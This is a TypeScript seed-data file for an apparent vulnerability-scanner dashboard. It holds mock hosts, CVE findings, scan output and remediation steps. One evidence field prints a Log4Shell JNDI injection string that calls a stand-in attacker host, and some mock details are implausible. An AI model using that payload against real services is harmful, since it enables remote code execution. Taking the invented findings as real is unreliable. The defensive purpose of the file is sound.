import { Asset, Vulnerability, ScanResult, ScheduledScan, RemediationTask, ActivityLog } from './types';

export const INITIAL_ASSETS: Asset[] = [
  {
    id: 'ast-101',
    ip: '192.168.1.15',
    hostname: 'srv-db-prod01.internal',
    os: 'Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0)',
    category: 'Server',
    status: 'Online',
    riskScore: 88,
    vulnerabilitiesCount: { critical: 2, high: 3, medium: 1, low: 2, info: 4 },
    openPorts: [22, 80, 443, 3306, 8080],
    tags: ['Production', 'Database', 'PCI-DSS'],
    lastScanned: '2026-07-22T18:30:00Z'
  },
  {
    id: 'ast-102',
    ip: '192.168.1.1',
    hostname: 'core-gateway.router.local',
    os: 'Cisco IOS-XE 17.6.3',
    category: 'Network Device',
    status: 'Online',
    riskScore: 62,
    vulnerabilitiesCount: { critical: 1, high: 1, medium: 4, low: 3, info: 2 },
    openPorts: [22, 80, 443, 161],
    tags: ['Infrastructure', 'Router'],
    lastScanned: '2026-07-21T10:15:00Z'
  },
  {
    id: 'ast-103',
    ip: '192.168.1.45',
    hostname: 'app-portal-web.local',
    os: 'Debian 11 (Bullseye)',
    category: 'Web App',
    status: 'Online',
    riskScore: 94,
    vulnerabilitiesCount: { critical: 3, high: 5, medium: 2, low: 1, info: 6 },
    openPorts: [80, 443, 8443],
    tags: ['Web', 'Customer Portal', 'Public Facing'],
    lastScanned: '2026-07-22T22:00:00Z'
  },
  {
    id: 'ast-104',
    ip: '192.168.1.102',
    hostname: 'dc-primary.corp.domain',
    os: 'Windows Server 2019 Datacenter',
    category: 'Server',
    status: 'Online',
    riskScore: 45,
    vulnerabilitiesCount: { critical: 0, high: 2, medium: 5, low: 4, info: 8 },
    openPorts: [53, 88, 135, 139, 389, 445, 636, 3268, 3389],
    tags: ['Active Directory', 'Domain Controller'],
    lastScanned: '2026-07-20T14:40:00Z'
  },
  {
    id: 'ast-105',
    ip: 'example.com',
    hostname: 'example.com (Edge CDN)',
    os: 'Cloudflare Edge / Nginx Proxy',
    category: 'Cloud Resource',
    status: 'Online',
    riskScore: 30,
    vulnerabilitiesCount: { critical: 0, high: 1, medium: 2, low: 5, info: 10 },
    openPorts: [80, 443],
    tags: ['External', 'Domain', 'Public'],
    lastScanned: '2026-07-22T12:00:00Z'
  }
];

export const INITIAL_VULNERABILITIES: Vulnerability[] = [
  {
    id: 'vuln-001',
    title: 'OpenSSL SSL/TLS Heartbeat Information Disclosure (Heartbleed)',
    description: 'An information disclosure vulnerability exists in OpenSSL 1.0.1 through 1.0.1f due to improper handling of TLS heartbeat extension packets. A remote attacker can read up to 64KB of server memory per heartbeat request.',
    severity: 'Critical',
    cvssScore: 9.8,
    cveId: 'CVE-2014-0160',
    affectedHost: '192.168.1.15',
    affectedPort: 443,
    service: 'https (OpenSSL 1.0.1e)',
    evidence: 'Heartbeat echo packet returned 61,440 bytes of process memory containing session cookies and private RSA key fragments.',
    riskLevel: 'Critical',
    businessImpact: 'Immediate exposure of active user SSL session tokens, credentials, and server TLS private keys leading to complete compromise of encrypted traffic.',
    recommendation: 'Upgrade OpenSSL to version 1.0.1g or later immediately and re-issue all SSL certificates.',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2014-0160',
      'https://heartbleed.com/'
    ],
    status: 'Open',
    remediation: {
      manualFix: 'Upgrade the system OpenSSL package using the distribution package manager and restart web server services.',
      bashCommands: [
        'sudo apt-get update && sudo apt-get install --only-upgrade openssl libssl-dev',
        'openssl version -a',
        'sudo systemctl restart nginx'
      ],
      patchRecommendation: 'Apply OpenSSL security patch 1.0.1g+ or Ubuntu Security Notice USN-2165-1.',
      verificationCommands: [
        'nmap -p 443 --script ssl-heartbleed 192.168.1.15'
      ]
    },
    aiAnalysis: {
      executiveSummary: 'A critical vulnerability (Heartbleed) allows unauthenticated remote attackers to extract sensitive data directly from system memory, including private encryption keys and passwords.',
      technicalExplanation: 'The OpenSSL implementation failed to validate the payload length field specified in TLS Heartbeat extension requests against the actual buffer payload length, allowing memory over-read.',
      whyDangerous: 'Exploitation is undetectable in standard logs and leaves zero traces while leaking live session secrets.',
      attackScenario: 'An attacker sends crafted heartbeat request packets to port 443, sequentially reading memory chunks until session keys or admin passwords are acquired.',
      businessImpact: 'Severe regulatory violations, loss of system confidentiality, potential unauthorized access to databases.',
      riskPriority: 'Immediate Action Required (P1)',
      stepByStepRemediation: [
        'Isolate the target server from public traffic if possible.',
        'Update OpenSSL using the package manager.',
        'Regenerate server SSL/TLS private keys and certificate signing requests.',
        'Revoke old certificates and deploy newly signed certificates.',
        'Force all active users to re-authenticate to invalidate compromised session tokens.'
      ],
      verificationSteps: [
        'Execute Nmap heartbeat script: `nmap -p 443 --script ssl-heartbleed <target>`',
        'Confirm output states "State: NOT VULNERABLE"'
      ],
      bestPractices: [
        'Automate weekly security patching for open-source libraries.',
        'Use Certificate Transparency logs and automated certificate lifecycle management.'
      ]
    },
    detectedAt: '2026-07-22T18:32:10Z',
    scanId: 'scn-1001'
  },
  {
    id: 'vuln-002',
    title: 'Apache Log4j Remote Code Execution (Log4Shell)',
    description: 'Apache Log4j2 versions 2.0-beta9 through 2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.',
    severity: 'Critical',
    cvssScore: 10.0,
    cveId: 'CVE-2021-44228',
    affectedHost: '192.168.1.45',
    affectedPort: 8080,
    service: 'http-alt (Apache Tomcat / Log4j 2.12.0)',
    evidence: 'Injected `${jndi:ldap://eval.attacker.site/a}` into User-Agent HTTP header triggered outbound DNS query callback from backend target.',
    riskLevel: 'Critical',
    businessImpact: 'Unauthenticated full remote code execution on the application server, allowing total host control, data exfiltration, and lateral movement.',
    recommendation: 'Update Log4j2 dependency to version 2.17.1 or higher.',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
      'https://logging.apache.org/log4j/2.x/security.html'
    ],
    status: 'Open',
    remediation: {
      manualFix: 'Update your application pom.xml / build.gradle to specify log4j-core >= 2.17.1, or set system property -Dlog4j2.formatMsgNoLookups=true as temporary mitigation.',
      bashCommands: [
        'export LOG4J_FORMAT_MSG_NO_LOOKUPS=true',
        'sudo systemctl restart tomcat9'
      ],
      powershellCommands: [
        '[Environment]::SetEnvironmentVariable("LOG4J_FORMAT_MSG_NO_LOOKUPS", "true", "Machine")',
        'Restart-Service -Name "Tomcat9"'
      ],
      patchRecommendation: 'Upgrade log4j-core to 2.17.1+',
      verificationCommands: [
        'grep -rn "log4j" /opt/tomcat/webapps/'
      ]
    },
    aiAnalysis: {
      executiveSummary: 'Log4Shell allows remote attackers to execute arbitrary code on the web portal host by simply sending a crafted string in standard HTTP headers.',
      technicalExplanation: 'Log4j parses logged message strings and resolves JNDI lookups without restricting protocols or destinations, allowing arbitrary Java class loading via LDAP.',
      whyDangerous: 'Simple to exploit with public tools; gives immediate shell access to system account.',
      attackScenario: 'An attacker submits a web request containing a JNDI LDAP lookup payload in the HTTP User-Agent header, which is logged by Tomcat and triggers external code execution.',
      businessImpact: 'Total application compromise, breach of customer PII, potential ransomware deployment.',
      riskPriority: 'Immediate Action Required (P1)',
      stepByStepRemediation: [
        'Locate all Java web archives containing log4j-core JAR files.',
        'Upgrade build scripts to compile against log4j-core 2.17.1+.',
        'Deploy updated WAR/JAR packages to staging and production.',
        'Verify outbound connection restrictions from application servers.'
      ],
      verificationSteps: [
        'Re-scan web application headers with Nikto and Log4Shell payload probes.'
      ],
      bestPractices: [
        'Implement Egress filtering on servers to block unauthorized LDAP/RMI outbound traffic.',
        'Use Software Bill of Materials (SBOM) tracking for software components.'
      ]
    },
    detectedAt: '2026-07-22T22:04:15Z',
    scanId: 'scn-1002'
  },
  {
    id: 'vuln-003',
    title: 'Missing HTTP Security Headers (HSTS & Content-Security-Policy)',
    description: 'The web application does not implement HTTPS Strict-Transport-Security (HSTS) or Content-Security-Policy (CSP) response headers, exposing clients to protocol downgrade attacks and Cross-Site Scripting (XSS).',
    severity: 'Medium',
    cvssScore: 5.3,
    cveId: 'N/A',
    affectedHost: 'example.com',
    affectedPort: 443,
    service: 'https (Nginx)',
    evidence: 'HTTP response header inspection revealed no `Strict-Transport-Security` or `Content-Security-Policy` header in server responses.',
    riskLevel: 'Medium',
    businessImpact: 'Increased risk of man-in-the-middle SSL stripping and client-side code injection vulnerabilities.',
    recommendation: 'Configure Nginx / Apache web server to return strict security headers on all responses.',
    references: [
      'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security',
      'https://owasp.org/www-project-secure-headers/'
    ],
    status: 'Open',
    remediation: {
      manualFix: 'Add HSTS and CSP directives to Nginx configuration block.',
      configSnippets: [
        '# In nginx.conf inside server block for SSL:',
        'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;',
        'add_header Content-Security-Policy "default-src \'self\'; script-src \'self\' \'unsafe-inline\'; style-src \'self\' \'unsafe-inline\';" always;',
        'add_header X-Frame-Options "SAMEORIGIN" always;',
        'add_header X-Content-Type-Options "nosniff" always;'
      ],
      bashCommands: [
        'sudo nginx -t',
        'sudo systemctl reload nginx'
      ],
      verificationCommands: [
        'curl -I -k https://example.com | grep -i "security"'
      ]
    },
    aiAnalysis: {
      executiveSummary: 'Missing security headers leave web portal users susceptible to transport downgrade and browser-side script execution attacks.',
      technicalExplanation: 'Without HSTS, browsers may initially attempt HTTP connections subject to interception. Without CSP, injected scripts run with trusted domain permissions.',
      whyDangerous: 'Enables network eavesdroppers to hijack sessions via SSL stripping or execute unauthorized actions via inline scripts.',
      attackScenario: 'A user on public Wi-Fi connects to the site; an attacker strips SSL and captures unencrypted session credentials.',
      businessImpact: 'Potential user credential theft and reduced trust in security posture.',
      riskPriority: 'Medium Priority (P3)',
      stepByStepRemediation: [
        'Open Nginx virtual host configuration.',
        'Append security header directives to the SSL server block.',
        'Test configuration syntax with `nginx -t`.',
        'Reload Nginx daemon.'
      ],
      verificationSteps: [
        'Use curl to check response headers: `curl -I https://example.com`'
      ],
      bestPractices: [
        'Enforce HTTPS globally with automatic 301 redirects.',
        'Audit HTTP response headers regularly using automated scanners.'
      ]
    },
    detectedAt: '2026-07-22T12:05:00Z',
    scanId: 'scn-1003'
  },
  {
    id: 'vuln-004',
    title: 'SMBv1 Protocol Enabled & Anonymous Pipe Access',
    description: 'The Windows Server target has legacy SMBv1 active and configured to allow null session anonymous enumeration of IPC$ named pipes.',
    severity: 'High',
    cvssScore: 8.1,
    cveId: 'CVE-2017-0144',
    affectedHost: '192.168.1.102',
    affectedPort: 445,
    service: 'microsoft-ds (Windows Server 2019)',
    evidence: 'Nmap smb-enum-shares script successfully listed administrative shares and IPC$ pipe without requiring credentials.',
    riskLevel: 'High',
    businessImpact: 'Exposes network host to EternalBlue exploits, unauthenticated domain discovery, and lateral propagation vectors.',
    recommendation: 'Disable SMBv1 via PowerShell or Windows Features and disable Null Session access.',
    references: [
      'https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3'
    ],
    status: 'In Progress',
    remediation: {
      manualFix: 'Disable SMB1 Protocol feature via PowerShell cmdlet and restart target host.',
      powershellCommands: [
        'Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force',
        'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" NullSessionPipes -Value @()',
        'Restart-Computer -Force'
      ],
      registryChanges: [
        'HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters -> SMB1 (DWORD 0)',
        'HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters -> RestrictNullSessAccess (DWORD 1)'
      ],
      verificationCommands: [
        'Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol'
      ]
    },
    detectedAt: '2026-07-20T14:45:00Z',
    scanId: 'scn-1004'
  },
  {
    id: 'vuln-005',
    title: 'MySQL Database Server Weak Password Authentication Method',
    description: 'MySQL service on port 3306 accepts older legacy native password authentication plugin with low iteration counts.',
    severity: 'Low',
    cvssScore: 3.7,
    cveId: 'N/A',
    affectedHost: '192.168.1.15',
    affectedPort: 3306,
    service: 'mysql (MySQL 8.0.28)',
    evidence: 'Handshake response indicates `mysql_native_password` enabled alongside `caching_sha2_password`.',
    riskLevel: 'Low',
    businessImpact: 'Increased susceptibility to offline password cracking if network traffic is captured.',
    recommendation: 'Enforce caching_sha2_password plugin for all MySQL database users.',
    references: ['https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html'],
    status: 'Fixed',
    remediation: {
      manualFix: 'Alter MySQL users to use caching_sha2_password plugin.',
      bashCommands: [
        'mysql -u root -p -e "ALTER USER \'appuser\'@\'%\' IDENTIFIED WITH caching_sha2_password BY \'StrongSecretPass!2026\'; FLUSH PRIVILEGES;"'
      ],
      verificationCommands: [
        'mysql -u root -p -e "SELECT User, Host, plugin FROM mysql.user;"'
      ]
    },
    detectedAt: '2026-07-19T09:12:00Z',
    scanId: 'scn-1005'
  }
];

export const INITIAL_SCANS: ScanResult[] = [
  {
    id: 'scn-1001',
    name: 'DB Cluster Deep Scan',
    target: '192.168.1.15',
    scanType: 'single',
    status: 'Completed',
    progress: 100,
    startTime: '2026-07-22T18:25:00Z',
    endTime: '2026-07-22T18:35:00Z',
    durationSeconds: 600,
    riskScore: 88,
    initiatedBy: 'admin@vulnsight.local',
    pluginsUsed: {
      nmapPortScan: true,
      niktoWebScan: true,
      whatWebTechScan: true,
      sslAnalysis: true,
      dnsLookup: true,
      whoisLookup: false,
      httpHeaderScan: true,
      osDetection: true,
      serviceDetection: true
    },
    discoveredHosts: [
      {
        ip: '192.168.1.15',
        hostname: 'srv-db-prod01.internal',
        status: 'Up',
        latencyMs: 1.4,
        openPorts: [
          { port: 22, service: 'ssh', version: 'OpenSSH 8.9p1' },
          { port: 80, service: 'http', version: 'Nginx 1.18.0' },
          { port: 443, service: 'https', version: 'OpenSSL 1.0.1e / Nginx' },
          { port: 3306, service: 'mysql', version: 'MySQL 8.0.28' },
          { port: 8080, service: 'http-alt', version: 'Apache Tomcat 9.0.50' }
        ],
        osGuess: 'Ubuntu Linux 22.04 LTS (Kernel 5.15)'
      }
    ],
    vulnerabilities: [INITIAL_VULNERABILITIES[0], INITIAL_VULNERABILITIES[4]],
    rawOutput: {
      nmap: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-07-22 18:25 UTC
Nmap scan report for 192.168.1.15
Host is up (0.0014s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     nginx 1.18.0
443/tcp  open  ssl/http nginx 1.18.0
3306/tcp open  mysql    MySQL 8.0.28
8080/tcp open  http-alt Apache Tomcat 9.0.50

| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library.
|     State: VULNERABLE
|     Risk factor: High
|     CVE: CVE-2014-0160
|_    Description: OpenSSL versions 1.0.1 through 1.0.1f contain a vulnerability in TLS heartbeat read memory over-read.

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
      nikto: `- Nikto v2.5.0
+ Target IP: 192.168.1.15
+ Target Port: 443
+ SSL Info: Cipher: ECDHE-RSA-AES256-SHA, Issuer: /C=US/ST=CA/O=VulnSight Self-Signed
+ OpenSSL/1.0.1e appears to be outdated and vulnerable to CVE-2014-0160 (Heartbleed).
+ Uncommon header 'x-powered-by' found: Tomcat/9.0.50`,
      whatweb: `http://192.168.1.15 [200 OK] Nginx[1.18.0], OpenSSL[1.0.1e], HTML5, Title[Database Management Admin]`,
      ssl: `Issuer: CN=VulnSight Dev CA\nValid From: 2023-01-01\nValid To: 2028-01-01\nVulnerable to Heartbleed extension over-read: YES\nSupported Ciphers: TLS_RSA_WITH_AES_256_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256`
    },
    notes: 'Routine security assessment of core production database server.'
  },
  {
    id: 'scn-1002',
    name: 'Subnet 192.168.1.0/24 Discovery',
    target: '192.168.1.0/24',
    scanType: 'network',
    status: 'Completed',
    progress: 100,
    startTime: '2026-07-22T21:50:00Z',
    endTime: '2026-07-22T22:15:00Z',
    durationSeconds: 1500,
    riskScore: 94,
    initiatedBy: 'sec_analyst@vulnsight.local',
    pluginsUsed: {
      nmapPortScan: true,
      niktoWebScan: true,
      whatWebTechScan: true,
      sslAnalysis: true,
      dnsLookup: true,
      whoisLookup: false,
      httpHeaderScan: true,
      osDetection: true,
      serviceDetection: true
    },
    discoveredHosts: [
      { ip: '192.168.1.1', hostname: 'core-gateway.router.local', status: 'Up', latencyMs: 0.8, openPorts: [{ port: 22, service: 'ssh' }, { port: 80, service: 'http' }, { port: 443, service: 'https' }] },
      { ip: '192.168.1.15', hostname: 'srv-db-prod01.internal', status: 'Up', latencyMs: 1.4, openPorts: [{ port: 22, service: 'ssh' }, { port: 80, service: 'http' }, { port: 443, service: 'https' }, { port: 3306, service: 'mysql' }] },
      { ip: '192.168.1.45', hostname: 'app-portal-web.local', status: 'Up', latencyMs: 2.1, openPorts: [{ port: 80, service: 'http' }, { port: 443, service: 'https' }, { port: 8080, service: 'http-alt' }] },
      { ip: '192.168.1.102', hostname: 'dc-primary.corp.domain', status: 'Up', latencyMs: 1.1, openPorts: [{ port: 53, service: 'domain' }, { port: 88, service: 'kerberos' }, { port: 445, service: 'microsoft-ds' }] }
    ],
    vulnerabilities: [INITIAL_VULNERABILITIES[1], INITIAL_VULNERABILITIES[3]],
    rawOutput: {
      nmap: 'Nmap ping scan report for 192.168.1.0/24\n4 active hosts found out of 256 scanned IP addresses.',
      nikto: 'Nikto scan completed for web application on 192.168.1.45:8080 - Log4j JNDI lookup callback detected.'
    }
  },
  {
    id: 'scn-1003',
    name: 'External Domain Edge Scan',
    target: 'example.com',
    scanType: 'domain',
    status: 'Completed',
    progress: 100,
    startTime: '2026-07-22T11:55:00Z',
    endTime: '2026-07-22T12:08:00Z',
    durationSeconds: 780,
    riskScore: 30,
    initiatedBy: 'admin@vulnsight.local',
    pluginsUsed: {
      nmapPortScan: true,
      niktoWebScan: true,
      whatWebTechScan: true,
      sslAnalysis: true,
      dnsLookup: true,
      whoisLookup: true,
      httpHeaderScan: true,
      osDetection: false,
      serviceDetection: true
    },
    discoveredHosts: [
      { ip: '93.184.216.34', hostname: 'example.com', status: 'Up', latencyMs: 14.2, openPorts: [{ port: 80, service: 'http' }, { port: 443, service: 'https' }] }
    ],
    vulnerabilities: [INITIAL_VULNERABILITIES[2]],
    rawOutput: {
      dns: 'A: 93.184.216.34\nMX: 10 mail.example.com\nNS: ns1.example.com, ns2.example.com',
      whois: 'Domain Name: EXAMPLE.COM\nRegistry Domain ID: 2336799_DOMAIN_COM-VRSN\nRegistrar: RESERVED-Internet Assigned Numbers Authority',
      httpHeader: 'HTTP/1.1 200 OK\nDate: Thu, 23 Jul 2026 00:00:00 GMT\nServer: ECS (342/261A)\nCache-Control: max-age=604800\nContent-Type: text/html; charset=UTF-8'
    }
  }
];

export const INITIAL_SCHEDULED_SCANS: ScheduledScan[] = [
  {
    id: 'sch-01',
    name: 'Weekly Production Subnet Audit',
    target: '192.168.1.0/24',
    scanType: 'network',
    frequency: 'Weekly',
    nextRun: '2026-07-26T02:00:00Z',
    enabled: true,
    plugins: {
      nmapPortScan: true,
      niktoWebScan: true,
      whatWebTechScan: true,
      sslAnalysis: true,
      dnsLookup: true,
      whoisLookup: false,
      httpHeaderScan: true,
      osDetection: true,
      serviceDetection: true
    }
  },
  {
    id: 'sch-02',
    name: 'Daily Public Domain Security Check',
    target: 'example.com',
    scanType: 'domain',
    frequency: 'Daily',
    nextRun: '2026-07-23T04:00:00Z',
    enabled: true,
    plugins: {
      nmapPortScan: true,
      niktoWebScan: true,
      whatWebTechScan: true,
      sslAnalysis: true,
      dnsLookup: true,
      whoisLookup: true,
      httpHeaderScan: true,
      osDetection: false,
      serviceDetection: true
    }
  }
];

export const INITIAL_REMEDIATION_TASKS: RemediationTask[] = [
  {
    id: 'task-01',
    vulnerabilityId: 'vuln-001',
    vulnerabilityTitle: 'OpenSSL SSL/TLS Heartbeat Information Disclosure (Heartbleed)',
    severity: 'Critical',
    affectedHost: '192.168.1.15',
    assignee: 'DevOps Lead (Sarah Miller)',
    status: 'In Progress',
    dueDate: '2026-07-24T18:00:00Z',
    notes: 'OpenSSL package upgrade scheduled during maintenance window tonight.'
  },
  {
    id: 'task-02',
    vulnerabilityId: 'vuln-002',
    vulnerabilityTitle: 'Apache Log4j Remote Code Execution (Log4Shell)',
    severity: 'Critical',
    affectedHost: '192.168.1.45',
    assignee: 'AppSec Lead (David Chen)',
    status: 'Open',
    dueDate: '2026-07-23T12:00:00Z',
    notes: 'Urgent WAR re-deployment required with Log4j 2.17.1 dependencies.'
  },
  {
    id: 'task-03',
    vulnerabilityId: 'vuln-004',
    vulnerabilityTitle: 'SMBv1 Protocol Enabled & Anonymous Pipe Access',
    severity: 'High',
    affectedHost: '192.168.1.102',
    assignee: 'SysAdmin (Alex Rivera)',
    status: 'Under Review',
    dueDate: '2026-07-25T17:00:00Z',
    notes: 'PowerShell script executed to disable SMB1. Awaiting host reboot.'
  }
];

export const INITIAL_ACTIVITY_LOGS: ActivityLog[] = [
  {
    id: 'act-001',
    timestamp: '2026-07-23T00:01:12Z',
    user: 'admin@vulnsight.local',
    action: 'User Authentication',
    details: 'User logged in successfully from 192.168.1.5',
    category: 'Auth'
  },
  {
    id: 'act-002',
    timestamp: '2026-07-22T22:15:00Z',
    user: 'sec_analyst@vulnsight.local',
    action: 'Scan Completed',
    details: 'Completed Subnet Scan for target 192.168.1.0/24 (Risk Score: 94)',
    category: 'Scan'
  },
  {
    id: 'act-003',
    timestamp: '2026-07-22T22:04:15Z',
    user: 'System Engine',
    action: 'Vulnerability Discovered',
    details: 'Found Critical Log4Shell (CVE-2021-44228) on 192.168.1.45',
    category: 'Vulnerability'
  },
  {
    id: 'act-004',
    timestamp: '2026-07-22T19:00:00Z',
    user: 'admin@vulnsight.local',
    action: 'Remediation Task Created',
    details: 'Assigned Heartbleed fix task to Sarah Miller',
    category: 'System'
  }
];
